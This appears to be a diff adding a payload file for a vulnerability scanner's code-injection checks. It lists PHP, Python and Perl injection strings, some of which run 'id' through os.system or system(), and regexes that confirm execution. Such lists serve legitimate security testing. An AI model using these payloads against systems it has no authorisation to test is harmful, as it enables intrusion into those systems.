@@ -1,0 +1,53 @@
+{
+    "description": "Code Injection",
+    "vuln_code": "CI",
+    "payloads": [
+            {
+            "payload": [
+                    "phpinfo();",
+                    ";PhPInFO();",
+                    "echo '[RANDOM_5]';echo '[RANDOM_5]';",
+                    ";echo '[RANDOM_5]';echo '[RANDOM_5]';",
+                    "print_r(\"[RANDOM_5]\");print_r(\"[RANDOM_5]\");",
+                    "print_r('[RANDOM_5]');print_r('[RANDOM_5]');",
+                    "PRiNt_R(\"[RANDOM_5]\");print_r(\"[RANDOM_5]\");",
+                    "priNT_r('[RANDOM_5]');print_r('[RANDOM_5]');"
+                ],
+            "verify": [
+                "PHP Version => \\d+\\.\\d+\\.\\d+[\\W\\w]+/etc/php", "[RANDOM_5][RANDOM_5]",
+                "(uid=\\d{4}\\(\\w+\\) gid=\\d{4}\\(\\w+\\).*)+"
+            ],
+            "tags": ["php"],
+            "type": "REGEX"
+        },
+        {
+            "payload": [
+                    "__import__('os').system('id')",
+                    "print(f'{[RANDOM_5]}{[RANDOM_5]}')",
+                    "f'{[RANDOM_5]}{[RANDOM_5]}",
+                    "__import__('subprocess').getoutput('id')"
+                ],
+            "verify": [
+                "(uid=\\d{4}\\(\\w+\\) gid=\\d{4}\\(\\w+\\).*)+",
+                "[RANDOM_5][RANDOM_5]"
+            ],
+            "tags": ["python"],
+            "type": "REGEX"
+        },
+        {
+            "payload": [
+                    "system('/bin/id')",
+                    ";system(\"/bin/id\")",
+                    ";;;;;system(\"/bin/id\")",
+                    "print '[RANDOM_5]';print '[RANDOM_5]';"
+
+                ],
+            "verify": [
+                "(uid=\\d{4}\\(\\w+\\) gid=\\d{4}\\(\\w+\\).*)+",
+                "[RANDOM_5][RANDOM_5]"
+            ],
+            "tags": ["perl"],
+            "type": "REGEX"
+        }
+    ]
+}
